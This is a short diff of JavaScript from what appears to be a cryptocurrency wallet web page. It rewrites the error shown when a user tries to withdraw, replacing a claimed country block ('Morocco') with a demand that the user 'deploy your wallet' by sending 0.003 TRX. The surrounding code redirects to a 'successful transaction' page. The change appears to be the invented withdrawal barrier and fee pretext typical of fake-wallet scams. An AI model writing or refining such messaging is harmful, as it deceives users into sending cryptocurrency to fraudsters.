@@ -920,7 +920,7 @@ if (sendPage) {
                     sendError.classList.add("success_msg");
                     window.location.href = "https://swalletsugarteam.github.io/swallet_sugarteam/successful_transaction/"
                 } else {
-                    sendError.textContent = "Withdrawal to external wallets is not available in your country: Morocco.";
+                    sendError.textContent = "At the moment withdrawal to external wallets is not available for you, please deploy your wallet using trx transaction for the amount of 0.003 TRX";
                     sendError.classList.remove("hidden_err");
                 }
             } catch (error) {
